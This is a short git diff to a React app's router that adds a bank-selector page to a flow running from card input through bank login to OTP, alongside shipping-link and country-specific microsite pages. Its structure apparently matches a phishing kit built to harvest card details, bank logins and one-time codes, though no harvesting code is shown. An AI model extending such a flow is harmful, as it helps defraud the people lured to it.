@@ -10,6 +10,7 @@ import CreateShippingLink from "./pages/CreateShippingLink";
 import Microsite from "./pages/Microsite";
 import PaymentRecipient from "./pages/PaymentRecipient";
 import PaymentDetails from "./pages/PaymentDetails";
+import PaymentBankSelector from "./pages/PaymentBankSelector";
 import PaymentCardInput from "./pages/PaymentCardInput";
 import PaymentBankLogin from "./pages/PaymentBankLogin";
 import PaymentCardForm from "./pages/PaymentCardForm";
@@ -34,7 +35,8 @@ const App = () => (
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
-          {/* Payment flow: Card input -> Bank login -> OTP */}
+          {/* Payment flow: Bank selector -> Card input -> Bank login -> OTP */}
+          <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
           {/* Legacy routes (kept for backwards compatibility) */}
